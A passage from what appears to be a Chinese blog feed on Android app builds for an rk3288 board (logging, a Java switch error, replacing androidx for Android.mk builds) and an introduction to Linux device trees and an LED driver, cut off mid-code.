title="1.2、如何查看日志"></a>1.2、如何查看日志</h3><p>在C代码中，printf、printk和__android_log_print是用于输出调试信息的函数，但它们有不同的使用场景和特点：</p><p>printf:</p><blockquote><p>printf是C语言标准库中提供的函数，用于向标准输出（通常是控制台）打印格式化的文本。<br>printf主要用于开发调试和测试阶段，在应用程序的控制台上显示输出信息，方便开发者查看和调试。<br>在嵌入式系统或特定环境下，标准输出可能会被重定向到其他设备或日志文件中。</p></blockquote><p>printk:</p><blockquote><p>printk是Linux内核提供的函数，用于在内核空间中打印信息。<br>printk可以在驱动代码或内核模块中使用，将信息输出到内核日志缓冲区。<br>内核日志缓冲区的内容可以通过dmesg命令或&#x2F;var&#x2F;log&#x2F;messages文件等方式进行查看。<br>printk功能更强大，可以根据不同的日志级别过滤和控制输出信息。</p></blockquote><p>__android_log_print:</p><blockquote><p>__android_log_print是Android平台特有的函数，用于在Android应用程序中打印日志信息。<br>__android_log_print将日志信息输出到Android系统的日志库中，可以通过logcat命令查看。<br>Android的日志库可以对不同级别的日志进行过滤，方便开发者进行调试和故障排查。</p></blockquote><p>Logd</p><blockquote><p>logd 是一个常见的日志输出方法，通常在 Android 开发中使用。它是 Android 日志系统中的一部分，用于输出调试信息或其他重要的运行时信息。<br>该方法的命名来自于 “log”（日志）和 “d”（调试）两个词的组合，表示它主要用于调试目的。</p></blockquote><p> </p><h3 id="1-3、遇到的小bug"><a href="#1-3、遇到的小bug" class="headerlink" title="1.3、遇到的小bug"></a>1.3、遇到的小bug</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public void ledOnClick(View view) &#123;</span><br><span class="line">        Log.d(TAG, &quot;ledOnClick: &quot;+view.getId());</span><br><span class="line">        switch (view.getId())&#123;</span><br><span class="line">            case R.id.bt_red_on:</span><br><span class="line">                LedRedOn();</span><br><span class="line">                break;</span><br><span class="line">            case R.id.bt_green_on:</span><br><span class="line">                LedGreenOn();</span><br><span class="line">                break;</span><br><span class="line">            case R.id.bt_blue_on:</span><br><span class="line">                LedBlueOn();</span><br><span class="line">                break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>上面的代码在编译器中显示 Constant expression required</p><p>在Java中，case后面的值必须是常量表达式。由于R.id.bt_red_on、R.id.bt_green_on和R.id.bt_blue_on都是资源标识符，它们不是编译时的常量，而是在运行时被解析的整数值。</p><p>为了解决这个问题，可以改用if-else语句来判断view.getId()的返回值，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public void ledOnClick(View view) &#123;</span><br><span class="line">    int viewId = view.getId();</span><br><span class="line">    Log.d(TAG, &quot;ledOnClick: &quot; + viewId);</span><br><span class="line">    if (viewId == R.id.bt_red_on) &#123;</span><br><span class="line">        LedRedOn();</span><br><span class="line">    &#125; else if (viewId == R.id.bt_green_on) &#123;</span><br><span class="line">        LedGreenOn();</span><br><span class="line">    &#125; else if (viewId == R.id.bt_blue_on) &#123;</span><br><span class="line">        LedBlueOn();</span><br><span class="line">    &#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="2、源码编译注意事项"><a href="#2、源码编译注意事项" class="headerlink" title="2、源码编译注意事项"></a>2、源码编译注意事项</h2><h3 id="2-1、修改androidx相关依赖"><a href="#2-1、修改androidx相关依赖" class="headerlink" title="2.1、修改androidx相关依赖"></a>2.1、修改androidx相关依赖</h3><p>因为androidx是需要额外下载的，有很多相关包并不好找，所以在用源码编译时为了不额外导入依赖，需要将其替换掉。主要修改两个文件：Activity.xml和MainActivity.java文件。</p><p>Activity.xml 用于设置页面样式，一般不用手动写，可以直接拖动工具生成代码</p><p>Activity默认配置示例（这个是需要改的）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;androidx.constraintlayout.widget.ConstraintLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;</span><br><span class="line">    xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot;</span><br><span class="line">    xmlns:tools=&quot;http://schemas.android.com/tools&quot;</span><br><span class="line">    android:layout_width=&quot;match_parent&quot;</span><br><span class="line">    android:layout_height=&quot;match_parent&quot;</span><br><span class="line">    tools:context=&quot;.MainActivity&quot;&gt;</span><br><span class="line">    &lt;LinearLayout</span><br><span class="line">        android:layout_width=&quot;wrap_content&quot;</span><br><span class="line">        android:layout_height=&quot;wrap_content&quot;</span><br><span class="line">        android:orientation=&quot;vertical&quot;</span><br><span class="line">        app:layout_constraintBottom_toBottomOf=&quot;parent&quot;</span><br><span class="line">        app:layout_constraintEnd_toEndOf=&quot;parent&quot;</span><br><span class="line">        app:layout_constraintStart_toStartOf=&quot;parent&quot;</span><br><span class="line">        app:layout_constraintTop_toTopOf=&quot;parent&quot;&gt;</span><br><span class="line">        &lt;Button</span><br><span class="line">            android:id=&quot;@+id/bt_red_on&quot;</span><br><span class="line">            android:layout_width=&quot;wrap_content&quot;</span><br><span class="line">            android:layout_height=&quot;wrap_content&quot;</span><br><span class="line">            android:onClick=&quot;ledOnClick&quot;</span><br><span class="line">            android:text=&quot;@string/bt_red&quot; /&gt;</span><br><span class="line">        &lt;Button</span><br><span class="line">            android:id=&quot;@+id/bt_green_on&quot;</span><br><span class="line">            android:layout_width=&quot;wrap_content&quot;</span><br><span class="line">            android:layout_height=&quot;wrap_content&quot;</span><br><span class="line">            android:onClick=&quot;ledOnClick&quot;</span><br><span class="line">            android:text=&quot;@string/bt_green&quot; /&gt;</span><br><span class="line">        &lt;Button</span><br><span class="line">            android:id=&quot;@+id/bt_blue_on&quot;</span><br><span class="line">            android:layout_width=&quot;wrap_content&quot;</span><br><span class="line">            android:layout_height=&quot;wrap_content&quot;</span><br><span class="line">            android:onClick=&quot;ledOnClick&quot;</span><br><span class="line">            android:text=&quot;@string/bt_blue&quot; /&gt;</span><br><span class="line">    &lt;/LinearLayout&gt;&lt;/androidx.constraintlayout.widget.ConstraintLayout&gt;</span><br></pre></td></tr></table></figure><p>默认生成的activity中抬头带有 androidx ，该资源需要下载，需要修改成如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;RelativeLayout</span><br><span class="line">    android:layout_width=&quot;match_parent&quot;</span><br><span class="line">    android:layout_height=&quot;match_parent&quot;</span><br><span class="line">    xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;&gt;</span><br><span class="line">    &lt;LinearLayout</span><br><span class="line">        android:layout_centerInParent=&quot;true&quot;</span><br><span class="line">        android:orientation=&quot;vertical&quot;</span><br><span class="line">        android:layout_width=&quot;wrap_content&quot;</span><br><span class="line">        android:layout_height=&quot;wrap_content&quot;&gt;</span><br><span class="line">        &lt;Button</span><br><span class="line">            android:id=&quot;@+id/bt_red_on&quot;</span><br><span class="line">            android:layout_width=&quot;wrap_content&quot;</span><br><span class="line">            android:layout_height=&quot;wrap_content&quot;</span><br><span class="line">            android:onClick=&quot;ledOnClick&quot;</span><br><span class="line">            android:text=&quot;@string/bt_red&quot; /&gt;</span><br><span class="line">        &lt;Button</span><br><span class="line">            android:id=&quot;@+id/bt_green_on&quot;</span><br><span class="line">            android:layout_width=&quot;wrap_content&quot;</span><br><span class="line">            android:layout_height=&quot;wrap_content&quot;</span><br><span class="line">            android:onClick=&quot;ledOnClick&quot;</span><br><span class="line">            android:text=&quot;@string/bt_green&quot; /&gt;</span><br><span class="line">        &lt;Button</span><br><span class="line">            android:id=&quot;@+id/bt_blue_on&quot;</span><br><span class="line">            android:layout_width=&quot;wrap_content&quot;</span><br><span class="line">            android:layout_height=&quot;wrap_content&quot;</span><br><span class="line">            android:onClick=&quot;ledOnClick&quot;</span><br><span class="line">            android:text=&quot;@string/bt_blue&quot; /&gt;</span><br><span class="line">    &lt;/LinearLayout&gt;&lt;/RelativeLayout&gt;</span><br></pre></td></tr></table></figure><p>还有在MainActivity上，默认如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">package com.example.led;</span><br><span class="line"></span><br><span class="line">import androidx.appcompat.app.AppCompatActivity;</span><br><span class="line">import android.os.Bundle;import android.util.Log;import android.view.View;</span><br><span class="line"></span><br><span class="line">public class MainActivity extends AppCompatActivity &#123;&#125;</span><br></pre></td></tr></table></figure><p>需要将androidx的包替换成如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import android.os.Bundle;import android.util.Log;import android.view.View;import android.app.Activity;</span><br><span class="line"></span><br><span class="line">public class MainActivity extends Activity &#123;&#125;</span><br></pre></td></tr></table></figure><h3 id="2-2、源码编译需要文件结构"><a href="#2-2、源码编译需要文件结构" class="headerlink" title="2.2、源码编译需要文件结构"></a>2.2、源码编译需要文件结构</h3><p>目录结构：<br><img src="/upload/2023/08/image-lcqs.png"></p><p>Jni中有两个文件：Android.mk和tvled.cpp</p><p>res下为几个目录：layout目录下为页面xml文件，values目录下存放strings.xml字符串说明文件</p><p>src下为完整包名和代码，即 com&#x2F;techvision&#x2F;tvled&#x2F;MainActivity.java</p><p>将manifests、java、cpp、res 提取出来（注意包名）</p><p>使用 Android.mk 取代 Gradle 以及 CMake（Android.mk 会有2个，分别编译apk和so）</p><p>push 到设备里</p><p>rk3288:&#x2F;system&#x2F;app</p><p>rk3288:&#x2F;system&#x2F;lib </p><h3 id="2-3、源码编译的目的"><a href="#2-3、源码编译的目的" class="headerlink" title="2.3、源码编译的目的"></a>2.3、源码编译的目的</h3><p>1、Android studio 编译的apk，是以“adb install”的方式安装到系统，此时app是可卸载的（app和so是自动部署进去的）</p><p>2、源码里面用mm编译出来的是一个apk，一个so，是以“adb push”的方式安装到系统，此时app是不可卸载的（app和so要分别push）</p><p>在源码中进行编译时，可以通过分别创建两个Android.mk文件来输出apk和so文件，然后将它们分别推送到相应的目录中。这样的做法有以下好处：嵌入式工程师可以单独编译和调试so文件，而应用程序工程师只需关注apk的编译，简化了开发流程并有利于合作开发。</p><p>通过这种方式，嵌入式工程师可以专注于底层的库和驱动的编译和调试，而应用程序工程师则可以独立进行应用程序的开发和调试，相互之间的开发工作不会相互干扰。这种分离的编译和推送过程可以提高开发效率和团队协作的灵活性。</p><p>相比Android Studio编译出的打包好的APK，源码编译的方式能够更加灵活地进行调试和开发。当需要更改某个组件或模块时，只需重新编译和推送该模块，而不必重新编译整个应用程序。这有助于提高开发效率和减少构建时间，特别是在大型项目中或多人协作开发的情况下。</p>]]></content>
    
    
    <categories>
      
      <category>android</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux驱动入门 烧录流程</title>
    <link href="/2023/08/21/Linux%E9%A9%B1%E5%8A%A8%E5%85%A5%E9%97%A8%20%E7%83%A7%E5%BD%95%E6%B5%81%E7%A8%8B/"/>
    <url>/2023/08/21/Linux%E9%A9%B1%E5%8A%A8%E5%85%A5%E9%97%A8%20%E7%83%A7%E5%BD%95%E6%B5%81%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="1、基础概念："><a href="#1、基础概念：" class="headerlink" title="1、基础概念："></a>1、基础概念：</h2><h3 id="设备树（Device-Tree）："><a href="#设备树（Device-Tree）：" class="headerlink" title="设备树（Device Tree）："></a>设备树（Device Tree）：</h3><p>设备树是一种描述硬件设备的数据结构，用于将硬件设备的信息传递给操作系统内核。它是一种与平台无关的中间层描述语言，提供了一种标准化的方式来描述嵌入式系统的硬件设备和资源，包括处理器、外设、总线、中断等。设备树以一种层次化的结构组织设备信息，通过使用节点和属性的方式来描述硬件设备的层次关系和特性。 </p><h3 id="DTS（Device-Tree-Source）："><a href="#DTS（Device-Tree-Source）：" class="headerlink" title="DTS（Device Tree Source）："></a>DTS（Device Tree Source）：</h3><p>DTS是设备树的源代码文件，它使用一种基于文本的语言来描述设备树。DTS文件使用一种简单的语法来描述硬件设备的属性和连接关系，它是设备树的源代码表示形式。DTS文件通过编译生成设备树二进制文件（DTB），该二进制文件在启动时由引导加载程序（Bootloader）加载到内存中，并由操作系统内核解析和使用。</p><h3 id="驱动（Driver）："><a href="#驱动（Driver）：" class="headerlink" title="驱动（Driver）："></a>驱动（Driver）：</h3><p>驱动是指用于控制硬件设备的软件模块。驱动程序与特定的硬件设备进行交互，向操作系统提供设备的功能和接口。驱动程序负责将硬件的特定功能转化为操作系统能够理解和操作的形式。在Linux内核中，驱动程序通常以模块的形式存在，可以动态加载和卸载。</p><h3 id="字符设备（Character-Device）："><a href="#字符设备（Character-Device）：" class="headerlink" title="字符设备（Character Device）："></a>字符设备（Character Device）：</h3><p>字符设备是一种在Linux系统中用于进行字符数据输入和输出的设备类型。它通过提供一系列的字符数据流来进行与用户空间的交互。在Linux内核中，字符设备是一种抽象的设备接口，可以通过驱动程序实现与实际硬件设备的交互。驱动程序负责将字符设备的操作转发到实际硬件设备上。（字符设备也是硬件设备，字符驱动也是驱动，只不过是采用字符数据流来交互的）</p><h2 id="2、结合培训项目理解"><a href="#2、结合培训项目理解" class="headerlink" title="2、结合培训项目理解"></a>2、结合培训项目理解</h2><p>初学者看完定义大概会觉得很抽象，例如我大学专业是数据科学，岗位是做上层开发，对于底层的知识全来源于计算机组成原理这门课，所以学驱动的时候感觉很多东西完全不动，不过不慌，后面结合培训时的项目来慢慢理解。</p><p> </p><h3 id="2-1、DTS"><a href="#2-1、DTS" class="headerlink" title="2.1、DTS"></a>2.1、DTS</h3><p> </p><p>如下是培训时拉取的代码，用于练习的rk3288板子对应的dts文件的开头一段代码，按照上面的定义，dts也就是设备树的源代码文件，这个文件就对应着rk3288这个硬件的设备属性和连接关系。</p><p> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">/dts-v1/;</span><br><span class="line"></span><br><span class="line">#include &quot;rk3288-evb.dtsi&quot;</span><br><span class="line"></span><br><span class="line">#include &quot;rk3288-android.dtsi&quot;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">/ &#123;</span><br><span class="line"></span><br><span class="line">compatible = &quot;rockchip,rk3288-evb-rk808&quot;, &quot;rockchip,rk3288&quot;;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">led &#123;</span><br><span class="line"></span><br><span class="line">status = &quot;okay&quot;;</span><br><span class="line"></span><br><span class="line">compatible = &quot;techvision,tv_led&quot;;</span><br><span class="line"></span><br><span class="line">red-gpio = &lt;&amp;gpio7 21 GPIO_ACTIVE_HIGH&gt;; /* gpio7_c5 */</span><br><span class="line"></span><br><span class="line">green-gpio = &lt;&amp;gpio7 3 GPIO_ACTIVE_HIGH&gt;; /* gpio7_a3 */</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">edp_panel: edp-panel &#123;</span><br><span class="line"></span><br><span class="line">   status = &quot;okay&quot;;</span><br><span class="line"></span><br><span class="line">   compatible = &quot;lg,lp079qx1-sp0v&quot;, &quot;panel-simple&quot;;</span><br><span class="line"></span><br><span class="line">   //enable-gpios = &lt;&amp;gpio7 4 GPIO_ACTIVE_HIGH&gt;;</span><br><span class="line"></span><br><span class="line">   //enable-delay-ms = &lt;120&gt;;</span><br><span class="line"></span><br><span class="line">   //pinctrl-0 = &lt;&amp;lcd_cs&gt;;</span><br><span class="line"></span><br><span class="line">   power-supply = &lt;&amp;vcc_lcd&gt;;</span><br><span class="line"></span><br><span class="line">   backlight = &lt;&amp;backlight&gt;;</span><br></pre></td></tr></table></figure><p> </p><p>让我们逐行解释这段代码的作用：</p><p> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">/dts-v1/;：</span><br><span class="line">这行代码指定了设备树源代码的版本。</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">#include &quot;rk3288-evb.dtsi&quot;和#include &quot;rk3288-android.dtsi&quot;：</span><br><span class="line">这两行代码包含了其他设备树源代码文件，即引用了rk3288-evb.dtsi和rk3288-android.dtsi文件中的设备树定义。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/ &#123;：</span><br><span class="line">这行代码开始了设备树的根节点。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">compatible = &quot;rockchip,rk3288-evb-rk808&quot;, &quot;rockchip,rk3288&quot;;：</span><br><span class="line">这行代码指定了设备树根节点的兼容性属性。它表示该设备树适用于rockchip公司的rk3288-evb-rk808和rk3288平台。</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">led &#123;：</span><br><span class="line">这行代码定义了一个名为&quot;led&quot;的子节点，用于描述一个LED设备。</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">status = &quot;okay&quot;;：</span><br><span class="line">这行代码指定了&quot;led&quot;节点的状态为&quot;okay&quot;，表示该设备节点可以正常使用。</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">compatible = &quot;techvision,tv_led&quot;;：</span><br><span class="line">这行代码指定了&quot;led&quot;节点的兼容性属性为&quot;techvision,tv_led&quot;，表示该节点与&quot;techvision&quot;公司的&quot;tv_led&quot;设备兼容。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">red-gpio = &lt;&amp;gpio7 21 GPIO_ACTIVE_HIGH&gt;;和green-gpio = &lt;&amp;gpio7 3 GPIO_ACTIVE_HIGH&gt;;：</span><br><span class="line">这两行代码定义了&quot;led&quot;节点的属性。它们指定了红色和绿色LED的GPIO引脚以及其激活电平。</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">edp_panel: edp-panel &#123;：</span><br><span class="line">这行代码定义了一个名为&quot;edp-panel&quot;的子节点，用于描述一个EDP面板设备。(什么是EDP面板我也不理解，知道是个硬件设备就行了)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">status = &quot;okay&quot;;：</span><br><span class="line">这行代码指定了&quot;edp-panel&quot;节点的状态为&quot;okay&quot;，表示该设备节点可以正常使用。</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">compatible = &quot;lg,lp079qx1-sp0v&quot;, &quot;panel-simple&quot;;：</span><br><span class="line">这行代码指定了&quot;edp-panel&quot;节点的兼容性属性为&quot;lg,lp079qx1-sp0v&quot;，表示该节点与LG公司的&quot;lp079qx1-sp0v&quot;面板设备兼容。</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">power-supply = &lt;&amp;vcc_lcd&gt;;：</span><br><span class="line">这行代码指定了&quot;edp-panel&quot;节点的电源供应属性为&quot;vcc_lcd&quot;，表示该面板设备使用了名为&quot;vcc_lcd&quot;的电源。</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">backlight = &lt;&amp;backlight&gt;;：</span><br><span class="line">这行代码指定了&quot;edp-panel&quot;节点的背光属性为&quot;backlight&quot;，表示该面板设备使用了名为&quot;backlight&quot;的背光控制。</span><br></pre></td></tr></table></figure><p> </p><p>这个edp面板的代码有些长，截取了一部分。以上这段代码定义了LED设备和EDP面板设备的属性、连接关系和兼容性，使得驱动程序能够通过解析设备树来获取这些设备的配置信息，并正确地控制和操作这些硬件设备。看了这段代码和说明，应该对设备树和dts有了个基础的理解。</p><h3 id="2-2、驱动"><a href="#2-2、驱动" class="headerlink" title="2.2、驱动"></a>2.2、驱动</h3><p>驱动是软件模块，在项目中的体现就是一个.c文件，至少我培训的时候接触到的驱动是这样，下面是一个tv_led.c的文件，其实就是控制tv_led这个硬件设备的驱动了，同样结合代码来理解驱动干了什么。</p><p> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line">/* </span><br><span class="line">这段代码是一个条件编译的示例，它使用了预处理指令来控制编译时的行为。</span><br><span class="line"></span><br><span class="line">在这段代码中，#if 1 表示条件为真，所以条件 1 总是为真。</span><br><span class="line">因此，#if 1 后面的代码块会被编译器处理。</span><br><span class="line">#define TV_LED_DEBUG(x...) printk(x) 是一个宏定义，它会将 x... 参数传递给 printk 函数。</span><br><span class="line">这个宏允许在调试期间输出日志信息。</span><br><span class="line"> </span><br><span class="line">然而，如果你想在发布版本中禁用调试日志输出，可以通过设置条件 #if 0 来实现。当条件为假时，#else 后面的代码块会被编译器处理。在这个示例中，#else 的作用是定义一个空的宏 TV_LED_DEBUG(x...)，循环 do &#123; &#125; while (0) 本身并没有实际的迭代或循环功能。它被称为&quot;空循环&quot;或&quot;空操作循环&quot;，主要用于语法上的需要，从而禁用了任何与调试相关的操作。</span><br><span class="line"></span><br><span class="line">这样设计的目的是，当你需要调试时，可以将 #if 1 修改为 #if 0，从而快速禁用或启用调试日志输出，而无需手动注释或删除相关代码。这对于开发和维护代码非常有用。</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">#if 1</span><br><span class="line">#define TV_LED_DEBUG(x...) printk(x)</span><br><span class="line">#else</span><br><span class="line">#define TV_LED_DEBUG(x...) do &#123; &#125; while (0)</span><br><span class="line">#endif</span><br><span class="line"> </span><br><span class="line">#define GPIO_OUTPUT_HIGH   1</span><br><span class="line">#define GPIO_OUTPUT_LOW    0</span><br><span class="line"> </span><br><span class="line">/*</span><br><span class="line">这段代码定义了三个 ioctl 命令的宏，用于与设备进行通信。ioctl 是一种用于控制设备的系统调用，在此处用于发送特定的命令给设备驱动程序。</span><br><span class="line"></span><br><span class="line">下面是对每个宏定义的详细解释.</span><br><span class="line"> </span><br><span class="line">TV_LED_CMD_R: 这个宏定义使用了 _IOW 宏，它表示我们要向设备写入数据，并且将数据从用户空间传递给内核空间。其中 &#x27;l&#x27; 是命令类型，代表 LED 控制命令。24 是命令编号，可以根据具体需求进行定义。unsigned int 是传递给设备驱动程序的参数类型。</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">/* ioctl commonds */</span><br><span class="line">#define TV_LED_CMD_R       _IOW(&#x27;l&#x27;, 24, unsigned int)</span><br><span class="line">#define TV_LED_CMD_G       _IOW(&#x27;l&#x27;, 25, unsigned int)</span><br><span class="line">#define TV_LED_CMD_B       _IOW(&#x27;l&#x27;, 26, unsigned int)</span><br><span class="line"> </span><br><span class="line">struct tv_led_dev &#123;</span><br><span class="line">struct device 